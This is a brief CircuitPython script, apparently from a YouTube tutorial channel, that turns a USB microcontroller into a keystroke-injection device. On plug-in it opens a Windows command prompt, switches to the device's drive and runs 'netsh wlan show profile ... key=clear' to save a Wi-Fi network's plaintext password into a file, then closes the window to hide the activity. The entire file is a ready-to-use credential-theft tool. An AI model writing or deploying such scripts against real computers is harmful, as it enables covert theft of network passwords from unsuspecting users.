# Tech Notebook
# youtube.com/technotebook
import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

time.sleep(3)

if not 'network.txt' in os.listdir():
    time.sleep(1.5)
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.11)

    layout.write("cmd\n")

    time.sleep(0.17)

    layout.write("e:\n")
    time.sleep(0.05)

    layout.write("netsh wlan show profile networkname key=clear > network.txt\n")

    time.sleep(0.6)

    keyboard.send(Keycode.ALT, Keycode.F4)
